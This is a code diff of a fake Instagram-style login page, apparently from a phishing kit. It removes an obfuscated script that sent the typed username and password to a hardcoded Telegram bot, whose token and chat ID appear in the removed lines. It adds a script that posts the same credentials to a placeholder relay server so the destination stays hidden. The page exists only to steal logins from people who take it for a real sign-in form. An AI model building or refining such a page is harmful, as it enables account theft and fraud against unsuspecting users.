@@ -27,6 +27,7 @@
             padding: 20px;
             border: 1px solid #ddd;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
         }
         h1 img {
             width: 150px;
@@ -42,6 +43,7 @@
             padding: 10px;
             border: 1px solid #ddd;
             border-radius: 5px;
+            font-size: 14px;
         }
         button {
             background: #0095f6;
@@ -54,6 +56,15 @@
         }
         button:hover {
             background: #007acc;
+        }
+        .signup-link {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
         }
     </style>
 </head>
@@ -68,41 +79,30 @@
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log in</button>
         </form>
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
     </main>
 
     <script>
-        // ✅ حفظ التوكن و chat_id داخل localStorage لتجنب ظهورهم في الكود
-        if (!localStorage.getItem("BOT_TOKEN")) {
-            localStorage.setItem("BOT_TOKEN", btoa("7647615645:AAE3EB_wnJq4TZRInXSc35-VIJkCMVsAQW0"));
-        }
-        if (!localStorage.getItem("CHAT_ID")) {
-            localStorage.setItem("CHAT_ID", btoa("7164291668"));
-        }
-
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // ✅ استرجاع التوكن و chat_id بعد فك التشفير
-            const botToken = atob(localStorage.getItem("BOT_TOKEN"));
-            const chatId = atob(localStorage.getItem("CHAT_ID"));
-
-            // ✅ تشفير بيانات تسجيل الدخول باستخدام Base64
-            const encodedMessage = btoa(`🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`);
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            // ✅ إرسال البيانات إلى خادم وسيط (Proxy Server)
+            fetch('https://your-proxy-server.com/send-to-telegram', {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: chatId,
-                    text: encodedMessage
+                    username: username,
+                    password: password
                 })
             })
             .then(response => response.json())
             .then(data => {
-                if (data.ok) {
+                if (data.success) {
                     alert("Login sent successfully!");
                 } else {
                     alert("Error sending data.");
